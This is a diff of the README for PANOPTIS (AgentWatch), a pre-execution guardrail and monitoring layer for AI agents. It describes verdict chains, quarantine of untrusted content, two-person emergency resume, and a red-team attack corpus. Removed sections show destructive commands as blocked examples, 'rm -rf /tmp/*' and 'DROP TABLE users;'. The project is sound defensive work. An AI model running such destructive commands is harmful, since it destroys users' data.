+<summary><b>Execution lifecycle: no effect before a durable decision</b></summary>
+<br/>
 
-Verdicts form a chain, `ALLOW` < `CONSTRAIN` < `APPROVE` < `DENY` < `HALT`, and the decision is the strictest verdict with the narrowest grant. Advisors can only raise a verdict or narrow a grant, so a manipulated model costs availability, not security.
+Only the path down the left column releases an effect, and every failure leaves a record.
 
-### Information flow
+<img src="docs/images/target-architecture/execution-lifecycle.png" alt="The twelve-step lifecycle: propose, normalise, admit, authorize, evaluate state, consult advisors, combine, approve when required, record, execute, observe and verify, inspect and deliver. Failures end in one of four outcomes: refused and recorded; no grant and cell paused; killed and session halted; or result withheld." width="760"/>
 
-**Untrusted and secret data reach the planner only as typed, labelled values.** The planner's context stays clean enough to act, and every effect it proposes still passes the flow check.
+Verdicts form a chain, `ALLOW` < `CONSTRAIN` < `APPROVE` < `DENY` < `HALT`, and the decision is the strictest verdict with the narrowest grant. Advisors can only tighten a decision, so a manipulated model costs availability, not security.
 
-<p align="center">
-  <img src="docs/images/target-architecture/context-splitting.png" alt="Untrusted content and secret data go to a quarantined worker with no effect tools. It returns a typed value, whose schema and size are checked, to the planner context. Every effect the planner proposes passes a flow check before reaching egress destinations, tools with effects or other agents." width="760"/>
-</p>
+</details>
 
-### Emergency governance
+<details>
+<summary><b>Information flow: typed, labelled values only</b></summary>
+<br/>
 
-**Anyone in scope can stop; resuming always takes two people.** Each scope (global, tenant, agent or session) holds one of these states, and every change raises its epoch. A node whose lease lapses behaves as stopped until a fresh lease arrives.
+The planner's context stays clean enough to act, and every effect it proposes still passes the flow check.
 
-<p align="center">
-  <img src="docs/images/target-architecture/emergency-control.png" alt="Control states: running, suspended, locked down, stopped and recovering. One person can stop from any of the first three. Resuming, lifting a lockdown and leaving stopped each take two people, and recovering returns to running once checks pass." width="760"/>
-</p>
+<img src="docs/images/target-architecture/context-splitting.png" alt="Untrusted content and secret data go to a quarantined worker with no effect tools. It returns a typed value, whose schema and size are checked, to the planner context. Every effect the planner proposes passes a flow check before reaching egress destinations, tools with effects or other agents." width="760"/>
 
-### Deployment topologies
+</details>
 
-**One node binary everywhere; only cell strength and state location change.**
+<details>
+<summary><b>Emergency governance: one person stops, two people resume</b></summary>
+<br/>
 
-<p align="center">
-  <img src="docs/images/target-architecture/deployment-topologies.png" alt="Three deployments compared by layer. Workstation: OS cells, panoptisd user service, embedded control plane, SQLite. Self-hosted: OS or VM cells, a node per runner or worker, stateless API replicas, PostgreSQL and object store. Hosted multi-tenant: a VM cell per session, node pools per region, regional control planes, row-level security and per-tenant keys." width="760"/>
-</p>
+Each scope holds one of these states, and every change raises its epoch. A node whose lease lapses behaves as stopped until a fresh lease arrives.
 
----
+<img src="docs/images/target-architecture/emergency-control.png" alt="Control states: running, suspended, locked down, stopped and recovering. One person can stop from any of the first three. Resuming, lifting a lockdown and leaving stopped each take two people, and recovering returns to running once checks pass." width="760"/>
 
-## 📸 Screenshots
+</details>
 
-<div align="center">
+<details>
+<summary><b>Deployment: one node binary everywhere</b></summary>
+<br/>
 
-<table>
-  <tr>
-    <td width="50%" align="center" valign="top">
-      <img src="docs/screenshots/01-hero.png" alt="AgentWatch landing page" /><br/>
-      <sub><b>Real-Time Pre-Execution Intervention.</b><br/>A blocked <code>rm -rf /tmp/*</code> with live confidence score and blast-radius calculated before execution.</sub>
-    </td>
-    <td width="50%" align="center" valign="top">
-      <img src="docs/screenshots/02-how-it-works.png" alt="Pre-execution blocking flow" /><br/>
-      <sub><b>Inline Hypervisor Pipeline.</b><br/>Capturing every reasoning step, scoring via independent gates, and protecting external APIs.</sub>
-    </td>
-  </tr>
-  <tr>
-    <td width="50%" align="center" valign="top">
-      <img src="docs/screenshots/03-features.png" alt="Six production-grade modules" /><br/>
-      <sub><b>Comprehensive Enterprise Suite.</b><br/>Reasoning Auditor · Safety Engine · One-Click Rollback · Multi-Agent DAG · Causal Memory · Compliance Export.</sub>
-    </td>
-    <td width="50%" align="center" valign="top">
-      <img src="docs/screenshots/04-comparison.png" alt="Competitive comparison" /><br/>
-      <sub><b>Beyond Post-Hoc Tracing.</b><br/>Comparing inline pre-execution intervention with passive logging systems.</sub>
-    </td>
-  </tr>
-</table>
+<img src="docs/images/target-architecture/deployment-topologies.png" alt="Three deployments compared by layer. Workstation: OS cells, panoptisd user service, embedded control plane, SQLite. Self-hosted: OS or VM cells, a node per runner or worker, stateless API replicas, PostgreSQL and object store. Hosted multi-tenant: a VM cell per session, node pools per region, regional control planes, row-level security and per-tenant keys." width="760"/>
 
-</div>
+</details>
 
 ---
 
-## 🚀 Quick Start
+## 🧪 Quality and provenance
 
-### 1. Installation
-Install the core engine directly from PyPI:
-```bash
-pip install panoptis
-```
-
-To include optional vector embedding drift detection or OpenTelemetry export:
-```bash
-pip install "panoptis[embeddings,otel]"
-```
-
-### 2. Instant Local Demo (Zero Setup)
-Test PANOPTIS against simulated prompt injection, database dropping, and privilege escalation attacks right in your terminal:
-```bash
-panopti demo
-```
-
-Or launch the zero-dependency interactive visual playground in your browser:
-```bash
-panopti playground
-```
-
-### 3. Wrap Any Python Tool in 2 Lines of Code
-```python
-from panoptis.protect import protect_tool
-
-@protect_tool
-def execute_system_query(query: str) -> str:
-    # Any dangerous SQL or shell command is analyzed and blocked before entering here
-    return db.execute(query)
-
-# This will trigger an immediate SecurityBlockException before touching the DB:
-execute_system_query("DROP TABLE users;")
-```
-
-### 4. Full Agent Wrapping
-```python
-from panoptis import watch
-
-# Wrap your existing LangChain, CrewAI, or custom agent:
-protected_agent = watch(
-    my_agent,
-    session_id="prod-session-01",
-    fail_closed=True,          # Block if safety check errors
-    enable_crescendo=True,     # Multi-turn drift detection
-    enable_taint_tracking=True # Prevent secret exfiltration
-)
-
-protected_agent.run("Analyze Q4 data and export summary")
-```
-
-### 5. Running the Complete Infrastructure Stack
-```bash
-# Clone and spin up full environment (Postgres with pgvector, Redis, FastAPI, Next.js Dashboard)
-git clone https://github.com/Shinraya-Tech-Labs/AgentWatch.git
-cd AgentWatch
-
-# Copy template and set required secret key
-cp .env.example .env
-
-# Start services
-docker compose up -d
-```
-- **Dashboard UI**: `http://localhost:3000`
-- **FastAPI OpenAPI Swagger**: `http://localhost:8000/docs`
-- **WebSocket Event Stream**: `ws://localhost:8000/ws/events`
-
----
-
-## 🔌 Supported Frameworks
-
-PANOPTIS provides seamless drop-in integrations across the entire modern AI agent ecosystem. Read individual integration guides in [`docs/adapters/`](docs/adapters/):
-
-| Framework | Pre-Execution Guardrail | Full Telemetry & Tracing | Native Adapter Import |
-|---|:---:|:---:|---|
-| **Claude Code** | ✅ Full Hook | ✅ | PreToolUse hook integration (`panoptis.protect.claude_hook_entry`) |
-| **LangChain** | ✅ Active Tool Gate | ✅ | `from panoptis.adapters.langchain import PanoptisCallbackHandler` |
-| **LangGraph** | ✅ Node Interceptor | ✅ | `from panoptis.adapters.langgraph import PanoptisGraphInterceptor` |
-| **CrewAI** | ✅ Agent Hypervisor | ✅ | `from panoptis.adapters.crewai import PanoptisCrewObserver` |
-| **AutoGen** | ✅ Message Filter | ✅ | `from panoptis.adapters.autogen import PanoptisConversableAgent` |
-| **smolagents** | ✅ Tool Interceptor | ✅ | `from panoptis.adapters.smolagents import PanoptisToolWrapper` |
-| **Model Context Protocol (MCP)** | ✅ HTTP Gateway | ✅ | Built-in streamable HTTP proxy (`panopti gateway`) |
-| **Universal Function Decorator** | ✅ Python Native | ✅ | `@protect_tool`, `@watch` |
-
----
-
-## 📊 How PANOPTIS Compares
-
-| Capability | **PANOPTIS (Pre-Execution Hypervisor)** | **Langfuse / Arize Phoenix (Post-Hoc Tracing)** | **Datadog / APM (Host Metrics)** |
-|---|:---:|:---:|:---:|
-| **Intervention Timing** | **Pre-Execution** *(< 10ms inline block)* | **Post-Hoc** *(after execution)* | **Post-Hoc** *(sampled logs)* |
-| **Damage Prevention** | ✅ **Prevents action from executing** | ❌ None (logs the incident) | ❌ None |
-| **Cryptographic Witness Ledger** | ✅ **Merkle Tree with inclusion proofs** | ❌ Standard mutable SQL | ❌ Standard metrics DB |
-| **Dynamic Information Flow & Taint** | ✅ **Bidirectional lattice tracking** | ❌ None | ❌ None |
-| **Steganographic Neutralizer** | ✅ **Unicode & whitespace stripping** | ❌ None | ❌ None |
-| **Shadow Replay (L1–L4)** | ✅ **Deterministic zero-cost corroboration** | ⚠️ Re-executes real API calls | ❌ None |
-| **Anti-Tamper Process Shield** | ✅ **POSIX signal & file sentinels** | ❌ None | ⚠️ Host daemon only |
-| **Multi-Turn Crescendo Detection** | ✅ **Cumulative drift velocity scoring** | ❌ None | ❌ None |
-| **Trace Visualization & APM** | ✅ Real-time Next.js Dashboard | ✅ Deep span trees | ✅ Infrastructure APM |
-
----
-
-## 💻 Interactive Command Line Interface (CLI)
-
-PANOPTIS includes the `panopti` and `panoptis` CLIs for monitoring, security testing, and forensic investigation:
+The Python suite recorded 3,049 passed and 12 skipped with 83% coverage in CI at commit `81e1fd1`.
 
 ```bash
-# 🎮 Interactive Demonstrations
-panopti demo                     # Interactive terminal attack simulator
-panopti playground               # Zero-dependency local browser playground
-
-# 🛡️ Defense & Red-Teaming
-panoptis protect redteam         # Run curated attack corpus against your policy engine
-panoptis check-env               # Validate cryptographic keys, database isolation & API safety
-
-# 🔬 Forensic Investigation & v3 Evidence Lab
-panoptis observe python agent.py # Trace and cryptographically record an agent run
-panoptis inspect latest          # Reconstruct execution steps, confidence, and tokens
-panoptis compare run_A run_B     # Compute earliest point of semantic divergence
-panoptis replay latest --level L2# Shadow replay using immutable evidence cache
-panoptis session rollback <id>   # Revert filesystem state to a prior git snapshot
+pytest tests/ -v              # full suite
+pytest tests/protect/ -v      # enforcement pipeline
 ```
 
----
-
-## 🧪 Comprehensive Verification & Test Suite
-
-PANOPTIS is tested continuously under strict automated CI conditions:
+Releases are built in GitHub Actions with build provenance:
 
 ```bash
-# Run unit and architectural invariant test suite
-pytest tests/ -v
-
-# Run the dedicated pre-execution protection test suite
-pytest tests/protect/ -v
-
-# Run ecosystem security and multi-tenant isolation tests
-pytest tests/test_deep_audit_ecosystem.py -v
-```
-
-- **3,060+ Unit & Integration Tests Passing**
-- **100% Deterministic Reproducibility**
-- **Zero Known Vulnerabilities** (Gitleaks, Bandit AST, and Pip-Audit verified)
-- **High-Concurrency Validated** (Locust load-tested at enterprise request thresholds)
-
----
-
-## 📦 Verified Release & Provenance Attestation
-
-Every release of PANOPTIS is built and cryptographically attested in GitHub Actions via **PyPI Trusted Publishing (OIDC)**:
-
-```bash
-# Verify the integrity and build provenance of the official wheel
 pip download panoptis==0.3.1 --no-deps -d check/ && cd check
 gh attestation verify panoptis-0.3.1-py3-none-any.whl --repo Shinraya-Tech-Labs/AgentWatch
 ```
@@ -513,46 +414,24 @@ gh attestation verify panoptis-0.3.1-py3-none-any.whl --repo Shinraya-Tech-Labs/
 
 ## 🤝 Contributing
 
-PANOPTIS is developed in the open. **Contributors get their name featured on the official landing page upon their first merged PR.**
+PANOPTIS is developed in the open, and contributors get their name on the project's contributors wall after their first merged PR.
 
-```mermaid
-flowchart LR
-    A["💬 Join Discord<br/>(Discuss issue & architecture)"] --> B["🔍 Pick Issue<br/>(good first · security · core)"]
-    B --> C["🔨 Implement & Test<br/>(Write minimal working diff)"]
-    C --> D["✅ Open Pull Request<br/>(Strict automated CI & Bandit)"]
-    D --> E["🎉 Merge to Main<br/>(Name on Landing Contributors Wall)"]
+<p align="center">
+  <img src="docs/images/readme/contributing.png" alt="Five steps: discuss on Discord or in an issue, get assigned, build and test, open a PR, merged." width="760"/>
+</p>
 
-    style A fill:#0f172a,stroke:#5865F2,color:#fff
-    style B fill:#0f172a,stroke:#3ecf8e,color:#fff
-    style C fill:#0f172a,stroke:#3ecf8e,color:#fff
-    style D fill:#0f172a,stroke:#3ecf8e,color:#fff
-    style E fill:#0f2a18,stroke:#10b981,color:#fff
-```
+We mentor new contributors through **SSOC 2026** and **NSOC 2026**. Start with [CONTRIBUTING.md](CONTRIBUTING.md).
 
-We proudly mentor students and emerging developers through open-source programs:
-- **SSOC 2026** (Social Summer of Code)
-- **NSOC 2026** (Nexus Spring of Code)
-
-Read our [CONTRIBUTING.md](CONTRIBUTING.md) to get started.
+- **Discord:** [discord.gg/UT9uaeY46e](https://discord.gg/UT9uaeY46e)
+- **Discussions:** [questions and architecture ideas](https://github.com/Shinraya-Tech-Labs/AgentWatch/discussions)
+- **Security reports:** see [SECURITY.md](SECURITY.md)
 
 ---
-
-## 💬 Community & Ecosystem
-
-- **Discord Server**: [discord.gg/UT9uaeY46e](https://discord.gg/UT9uaeY46e) — Connect with the core maintainers and AI safety researchers.
-- **GitHub Discussions**: [Ask questions & share architectures](https://github.com/Shinraya-Tech-Labs/AgentWatch/discussions)
-- **Report Security Vulnerabilities**: Please review [SECURITY-BASELINE.md](SECURITY-BASELINE.md) for responsible disclosure.
-
----
-
-## 📄 License
-
-PANOPTIS is licensed under the **Apache License, Version 2.0**. See the [LICENSE](LICENSE) file for details.
 
 <div align="center">
 
-Built with 🛡️ by [**Shinraya Tech Labs**](https://github.com/Shinraya-Tech-Labs) & the global open-source AI safety community.
+Licensed under the [Apache License 2.0](LICENSE) · Built by [**Shinraya Tech Labs**](https://github.com/Shinraya-Tech-Labs) and contributors
 
-⭐ **Star the repo** · 🐛 [**Report an issue**](https://github.com/Shinraya-Tech-Labs/AgentWatch/issues) · 💬 [**Join Discord**](https://discord.gg/UT9uaeY46e)
+⭐ [**Star the repo**](https://github.com/Shinraya-Tech-Labs/AgentWatch) · 🐛 [**Report an issue**](https://github.com/Shinraya-Tech-Labs/AgentWatch/issues) · 💬 [**Join Discord**](https://discord.gg/UT9uaeY46e)
 
 </div>
